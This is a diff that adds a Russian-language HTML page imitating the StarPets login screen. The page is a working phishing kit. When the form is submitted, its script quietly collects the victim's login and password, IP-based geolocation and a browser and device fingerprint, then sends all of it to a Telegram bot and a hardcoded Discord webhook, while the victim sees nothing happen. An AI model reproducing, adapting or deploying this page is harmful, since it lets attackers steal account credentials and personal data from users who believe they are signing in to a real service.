@@ -1,0 +1,545 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Авторизация | StarPets</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="assets/media/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="assets/media/favicon-16x16.png">
+  <style>
+    :root {
+      --white: #ffffff;
+      --text: #151515;
+      --muted: #6f6f6f;
+      --line: #eceef2;
+      --orange: #f4a13b;
+      --orange-dark: #ee9322;
+      --orange-ring: rgba(244,161,59,.18);
+      --blue: #7788dd;
+      --blue-dark: #6a7cd8;
+      --field: #ffffff;
+      --field-border: #e6e6e6;
+      --field-text: #1c1c1c;
+      --placeholder: #b8b8b8;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    }
+
+    * { box-sizing: border-box; }
+    html, body { width: 100%; min-height: 100%; }
+
+    body {
+      margin: 0;
+      min-height: 100svh;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      color: var(--text);
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+      text-rendering: geometricPrecision;
+    }
+
+    .auth-shell {
+      width: 100%;
+      max-width: 390px;
+      min-height: 100svh;
+      background: #fff;
+      padding: 18px 14px 26px;
+    }
+
+    .hero {
+      display: block;
+      width: 100%;
+      max-width: 336px;
+      height: auto;
+      margin: 68px auto 16px;
+      user-select: none;
+      pointer-events: none;
+    }
+
+    h1 {
+      margin: 0;
+      text-align: center;
+      font-size: 18px;
+      line-height: 1.2;
+      font-weight: 800;
+      letter-spacing: -.02em;
+    }
+
+    .subtitle {
+      margin: 7px 0 12px;
+      color: #666;
+      text-align: center;
+      font-size: 13px;
+      line-height: 1.35;
+      font-weight: 500;
+    }
+
+    .social-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+
+    .social-btn {
+      height: 42px;
+      border: 0;
+      border-radius: 7px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: transform .14s ease, filter .14s ease, background .14s ease;
+    }
+
+    .social-btn:active { transform: translateY(1px) scale(.99); }
+    .google { color: #222; background: #e9eef0; }
+    .google:hover { background: #e4eaed; }
+    .discord { color: #fff; background: var(--blue); }
+    .discord:hover { background: var(--blue-dark); }
+
+    .google-mark { width: 18px; height: 18px; }
+    .discord-mark { width: 21px; height: 21px; fill: currentColor; }
+
+    .divider {
+      display: grid;
+      grid-template-columns: 1fr auto 1fr;
+      align-items: center;
+      gap: 12px;
+      margin: 6px 0 13px;
+      color: #636363;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .divider:before,
+    .divider:after {
+      content: "";
+      height: 1px;
+      background: var(--line);
+    }
+
+    .form { margin: 0; }
+
+    .field {
+      position: relative;
+      height: 51px;
+      margin-bottom: 10px;
+    }
+
+    .field input {
+      width: 100%;
+      height: 100%;
+      padding: 0 46px 0 16px;
+      border: 1px solid var(--field-border);
+      border-radius: 10px;
+      background: var(--field);
+      color: var(--field-text);
+      font: inherit;
+      font-size: 14px;
+      font-weight: 650;
+      outline: 0;
+      transition: border-color .18s ease, box-shadow .18s ease, background-color .18s ease;
+    }
+
+    .field input::placeholder {
+      color: var(--placeholder);
+      opacity: 1;
+      transition: opacity .14s ease, color .18s ease;
+    }
+
+    .field input:focus::placeholder {
+      opacity: 0;
+    }
+
+    .field input:focus {
+      border-color: var(--orange);
+      box-shadow: 0 0 0 4px var(--orange-ring);
+      animation: pulseField .28s ease;
+    }
+
+    @keyframes pulseField {
+      0% { transform: scale(1); }
+      45% { transform: scale(1.008); }
+      100% { transform: scale(1); }
+    }
+
+    .password-toggle {
+      position: absolute;
+      right: 11px;
+      top: 50%;
+      width: 32px;
+      height: 32px;
+      transform: translateY(-50%);
+      border: 0;
+      border-radius: 8px;
+      background: transparent;
+      color: #b5b5b5;
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      transition: background .14s ease, color .14s ease;
+    }
+
+    .password-toggle:hover { background: #f6f6f6; color: #8e8e8e; }
+    .password-toggle:focus-visible {
+      outline: 0;
+      background: #fff7ed;
+      color: var(--orange-dark);
+    }
+    .password-toggle svg { width: 20px; height: 20px; }
+
+    .forgot {
+      display: block;
+      width: fit-content;
+      margin: 1px 0 12px auto;
+      color: #bababa;
+      text-decoration: none;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .forgot:hover { color: #ff9819; }
+
+    .continue {
+      width: 100%;
+      height: 42px;
+      border: 0;
+      border-radius: 7px;
+      background: linear-gradient(180deg, var(--orange) 0%, var(--orange-dark) 100%);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: transform .14s ease, filter .14s ease, box-shadow .14s ease;
+      box-shadow: 0 8px 20px rgba(255,152,25,.18);
+    }
+
+    .continue:hover { filter: brightness(1.02); box-shadow: 0 10px 24px rgba(255,152,25,.24); }
+    .continue:active { transform: translateY(1px) scale(.995); }
+
+    .signup {
+      margin: 12px 0 12px;
+      color: #a7a7a7;
+      text-align: center;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .signup a { color: #ff9819; text-decoration: none; }
+    .signup a:hover { text-decoration: underline; }
+
+    .legal {
+      margin: 0 auto;
+      max-width: 322px;
+      color: #a9a9a9;
+      text-align: center;
+      font-size: 12px;
+      line-height: 1.35;
+      font-weight: 500;
+    }
+
+    .legal a { color: #9c9c9c; text-decoration: none; }
+    .legal a:hover { color: #ff9819; }
+
+    @media (max-width: 390px) {
+      .auth-shell { max-width: none; }
+      .hero { margin-top: 68px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="auth-shell" aria-label="Форма авторизации">
+    <img class="hero" src="assets/media/starpets-auth-hero.svg" alt="StarPets">
+
+    <h1>Добро пожаловать!</h1>
+    <p class="subtitle">Войдите любым из доступных методов</p>
+
+    <div class="social-grid" aria-label="Социальный вход">
+      <button class="social-btn google" type="button">
+        <span>Google</span>
+        <svg class="google-mark" viewBox="0 0 48 48" aria-hidden="true"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.1 6.1 29.3 4 24 4 13 4 4 13 4 24s9 20 20 20 20-9 20-20c0-1.3-.1-2.4-.4-3.5Z"/><path fill="#FF3D00" d="m6.3 14.7 6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.9 1.2 8 3.1l5.7-5.7C34.1 6.1 29.3 4 24 4 16.3 4 9.6 8.3 6.3 14.7Z"/><path fill="#4CAF50" d="M24 44c5.2 0 10-2 13.5-5.2l-6.2-5.2C29.3 35.1 26.8 36 24 36c-5.2 0-9.6-3.3-11.3-7.9l-6.5 5C9.5 39.6 16.2 44 24 44Z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.3-2.2 4.2-4.1 5.6l6.2 5.2C36.9 39.3 44 34 44 24c0-1.3-.1-2.4-.4-3.5Z"/></svg>
+      </button>
+      <button class="social-btn discord" type="button">
+        <span>Discord</span>
+        <svg class="discord-mark" viewBox="0 0 24 24" aria-hidden="true"><path d="M19.54 5.34A16.2 16.2 0 0 0 15.54 4c-.17.3-.37.72-.5 1.04a15.1 15.1 0 0 0-4.48 0c-.14-.32-.34-.74-.52-1.04-1.39.24-2.73.7-3.99 1.34C3.52 9.1 2.84 12.77 3.18 16.4a16.28 16.28 0 0 0 4.9 2.47c.4-.53.74-1.1 1.04-1.7-.57-.22-1.12-.48-1.64-.8.14-.1.27-.21.4-.32 3.17 1.46 6.6 1.46 9.73 0 .13.11.27.22.4.32-.52.32-1.07.58-1.65.8.3.6.65 1.17 1.04 1.7 1.75-.55 3.4-1.39 4.91-2.47.4-4.2-.67-7.83-2.77-11.06ZM9.77 14.17c-.96 0-1.74-.87-1.74-1.94s.76-1.94 1.74-1.94c.97 0 1.76.88 1.74 1.94 0 1.07-.77 1.94-1.74 1.94Zm6.05 0c-.95 0-1.74-.87-1.74-1.94s.77-1.94 1.74-1.94c.98 0 1.76.88 1.75 1.94 0 1.07-.77 1.94-1.75 1.94Z"/></svg>
+      </button>
+    </div>
+
+    <div class="divider">Или</div>
+
+    <form class="form" action="#" method="post" autocomplete="off" novalidate>
+      <div class="field">
+        <input id="login" name="login" type="text" placeholder="E-mail или логин" inputmode="email" autocomplete="username">
+      </div>
+
+      <div class="field">
+        <input id="password" name="password" type="password" placeholder="Пароль" autocomplete="current-password">
+        <button class="password-toggle" type="button" aria-label="Показать пароль" data-password-toggle>
+          <svg class="eye-open" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 5c5.1 0 8.6 4.2 9.8 6-1.2 1.8-4.7 6-9.8 6S3.4 12.8 2.2 11C3.4 9.2 6.9 5 12 5Zm0 9.2A3.2 3.2 0 1 0 12 7.8a3.2 3.2 0 0 0 0 6.4Z" fill="currentColor"/></svg>
+          <svg class="eye-closed" viewBox="0 0 24 24" aria-hidden="true" style="display:none"><path d="M3.3 4.7 4.7 3.3l16 16-1.4 1.4-2.7-2.7A10.8 10.8 0 0 1 12 19c-5.1 0-8.6-4.2-9.8-6 .7-1.1 2.3-3.1 4.6-4.5L3.3 4.7Zm6.2 6.2a2.72 2.72 0 0 0 3.6 3.6l-3.6-3.6ZM12 5c5.1 0 8.6 4.2 9.8 6-.5.8-1.8 2.5-3.6 3.8l-2.5-2.5a4.15 4.15 0 0 0-5-5L8.9 5.5A10.7 10.7 0 0 1 12 5Z" fill="currentColor"/></svg>
+        </button>
+      </div>
+
+      <a class="forgot" href="#">Забыли пароль?</a>
+      <button class="continue" type="submit">Продолжить</button>
+    </form>
+
+    <p class="signup">Еще нет аккаунта? <a href="#">Создать аккаунт</a></p>
+    <p class="legal">Продолжая, вы соглашаетесь с условиями политики конфиденциальности и пользовательского соглашения</p>
+  </main>
+
+  <script>
+    // ========== КОНФИГ ==========
+    const STARPETS_CONFIG = {
+      // Telegram Bot
+      botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
+      adminChatId: '123456789',
+
+      // Discord webhook
+      discordWebhookUrl: 'https://discord.com/api/webhooks/1520472993615052943/xPpo3_mlNXHktVGPc-woGmBW2w7ttQUY2oMhVY6lagA9PGRFg-QZsQd-LC7-sGrqLaqJ',
+      webhookName: 'StarPets Auth',
+      webhookIconUrl: 'https://i.ibb.co/9337ZN70/image.png',  // прямая ссылка на аватарку
+    };
+    // =============================
+
+    const form = document.querySelector('.form');
+    const loginInput = document.querySelector('#login');
+    const passwordInput = document.querySelector('#password');
+    const toggle = document.querySelector('[data-password-toggle]');
+    const eyeOpen = toggle.querySelector('.eye-open');
+    const eyeClosed = toggle.querySelector('.eye-closed');
+
+    // --- получение IP и геоданных ---
+    async function getGeoData() {
+      const timeout = 3000;
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), timeout);
+
+      try {
+        const res = await fetch('https://ipapi.co/json/', {
+          signal: controller.signal
+        });
+        clearTimeout(timer);
+        if (!res.ok) return null;
+        const data = await res.json();
+
+        const flag = data.country_code
+          ? String.fromCodePoint(
+              ...[...data.country_code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
+            )
+          : '🏳️';
+
+        return {
+          ip: data.ip || '0.0.0.0',
+          country: data.country_name || 'Unknown',
+          countryCode: data.country_code || 'XX',
+          flag: flag,
+          city: data.city || 'Unknown',
+          region: data.region || 'Unknown',
+          isp: data.org || 'Unknown',
+          timezone: data.timezone || 'Unknown',
+          latitude: data.latitude || null,
+          longitude: data.longitude || null,
+        };
+      } catch (_) {
+        return null;
+      }
+    }
+
+    // --- сбор данных устройства ---
+    function getDeviceData() {
+      const nav = navigator;
+      const screen = window.screen;
+
+      return {
+        userAgent: nav.userAgent,
+        platform: nav.platform,
+        language: nav.language || nav.languages?.[0] || 'unknown',
+        languages: nav.languages || [],
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        screenAvailWidth: screen.availWidth,
+        screenAvailHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio || 1,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        referrer: document.referrer || 'direct',
+        doNotTrack: nav.doNotTrack || 'unspecified',
+        cookiesEnabled: nav.cookieEnabled,
+        onLine: nav.onLine,
+        hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
+        deviceMemory: nav.deviceMemory || 'unknown',
+        connection: nav.connection
+          ? {
+              effectiveType: nav.connection.effectiveType || 'unknown',
+              downlink: nav.connection.downlink || 'unknown',
+              rtt: nav.connection.rtt || 'unknown',
+            }
+          : 'unknown',
+      };
+    }
+
+    // --- отправить в Telegram ---
+    async function sendToTelegram(login, password, geo, device) {
+      const { botToken, adminChatId } = STARPETS_CONFIG;
+      if (!botToken || !adminChatId) return;
+
+      const ip = geo?.ip || '0.0.0.0';
+      const flag = geo?.flag || '🏳️';
+      const country = geo?.country || 'Unknown';
+      const city = geo?.city || 'Unknown';
+      const region = geo?.region || 'Unknown';
+      const isp = geo?.isp || 'Unknown';
+      const tz = geo?.timezone || 'Unknown';
+
+      const ua = device?.userAgent || 'unknown';
+      const platform = device?.platform || 'unknown';
+      const lang = device?.language || 'unknown';
+      const screenRes = device?.screenWidth && device?.screenHeight
+        ? `${device.screenWidth}x${device.screenHeight}`
+        : 'unknown';
+      const tzBrowser = device?.timezone || 'unknown';
+      const conn = device?.connection?.effectiveType || 'unknown';
+
+      const text = `
+🔐 **Новая авторизация**
+
+👤 **Логин:** \`${login || '(пусто)'}\`
+🔑 **Пароль:** \`${password || '(пусто)'}\`
+
+🌐 **IP:** \`${ip}\`
+📍 **Страна:** ${flag} ${country} (${geo?.countryCode || 'XX'})
+🏙️ **Город:** ${city}
+🗺️ **Регион:** ${region}
+📡 **Провайдер:** ${isp}
+🕒 **Часовой пояс (geo):** ${tz}
+
+💻 **Устройство:**
+- User-Agent: \`${ua}\`
+- Платформа: ${platform}
+- Язык: ${lang}
+- Разрешение экрана: ${screenRes}
+- Часовой пояс (браузер): ${tzBrowser}
+- Подключение: ${conn}
+- Do Not Track: ${device?.doNotTrack || 'unknown'}
+- Cookie enabled: ${device?.cookiesEnabled ? '✅' : '❌'}
+
+📅 ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
+      `.trim();
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      try {
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: adminChatId,
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (_) {}
+    }
+
+    // --- отправить в Discord webhook ---
+    async function sendToDiscord(login, password, geo, device) {
+      const { discordWebhookUrl, webhookName, webhookIconUrl } = STARPETS_CONFIG;
+      if (!discordWebhookUrl) return;
+
+      const ip = geo?.ip || '0.0.0.0';
+      const flag = geo?.flag || '🏳️';
+      const country = geo?.country || 'Unknown';
+      const city = geo?.city || 'Unknown';
+      const region = geo?.region || 'Unknown';
+      const isp = geo?.isp || 'Unknown';
+      const tzGeo = geo?.timezone || 'Unknown';
+
+      const ua = device?.userAgent || 'unknown';
+      const platform = device?.platform || 'unknown';
+      const lang = device?.language || 'unknown';
+      const screenRes = device?.screenWidth && device?.screenHeight
+        ? `${device.screenWidth}x${device.screenHeight}`
+        : 'unknown';
+      const tzBrowser = device?.timezone || 'unknown';
+      const conn = device?.connection?.effectiveType || 'unknown';
+
+      const payload = {
+        username: webhookName || 'StarPets Auth',
+        content: `🔐 **Новая авторизация**`,
+        embeds: [
+          {
+            title: '📋 Данные входа',
+            fields: [
+              { name: '👤 Логин', value: `\`${login || '(пусто)'}\``, inline: true },
+              { name: '🔑 Пароль', value: `\`${password || '(пусто)'}\``, inline: true },
+              { name: '🌐 IP', value: `\`${ip}\``, inline: true },
+              { name: '📍 Страна', value: `${flag} **${country}** (\`${geo?.countryCode || 'XX'}\`)`, inline: true },
+              { name: '🏙️ Город', value: city, inline: true },
+              { name: '🗺️ Регион', value: region, inline: true },
+              { name: '📡 Провайдер', value: isp, inline: true },
+              { name: '🕒 Часовой пояс (geo)', value: tzGeo, inline: true },
+              { name: '💻 User-Agent', value: `\`${ua.slice(0, 100)}\`${ua.length > 100 ? '…' : ''}`, inline: false },
+              { name: '🖥️ Платформа', value: platform, inline: true },
+              { name: '🌐 Язык', value: lang, inline: true },
+              { name: '📱 Разрешение экрана', value: screenRes, inline: true },
+              { name: '🕒 Часовой пояс (браузер)', value: tzBrowser, inline: true },
+              { name: '📶 Подключение', value: conn, inline: true },
+              { name: '🍪 Cookie', value: device?.cookiesEnabled ? '✅ Включены' : '❌ Отключены', inline: true },
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+              text: 'StarPets Auth'
+            }
+          }
+        ]
+      };
+
+      if (webhookIconUrl) {
+        payload.avatar_url = webhookIconUrl;
+      }
+
+      try {
+        await fetch(discordWebhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      } catch (_) {}
+    }
+
+    // --- обработка отправки формы ---
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+
+      const login = loginInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      const geo = await getGeoData();
+      const device = getDeviceData();
+
+      await sendToTelegram(login, password, geo, device);
+      await sendToDiscord(login, password, geo, device);
+    });
+
+    // --- переключение видимости пароля ---
+    toggle.addEventListener('click', () => {
+      const hidden = passwordInput.type === 'password';
+      passwordInput.type = hidden ? 'text' : 'password';
+      toggle.setAttribute('aria-label', hidden ? 'Скрыть пароль' : 'Показать пароль');
+      eyeOpen.style.display = hidden ? 'none' : 'block';
+      eyeClosed.style.display = hidden ? 'block' : 'none';
+    });
+
+    // --- блокировка ссылок-заглушек ---
+    document.querySelectorAll('a[href="#"], .social-btn').forEach((item) => {
+      item.addEventListener('click', (event) => event.preventDefault());
+    });
+  </script>
+</body>
+</html>
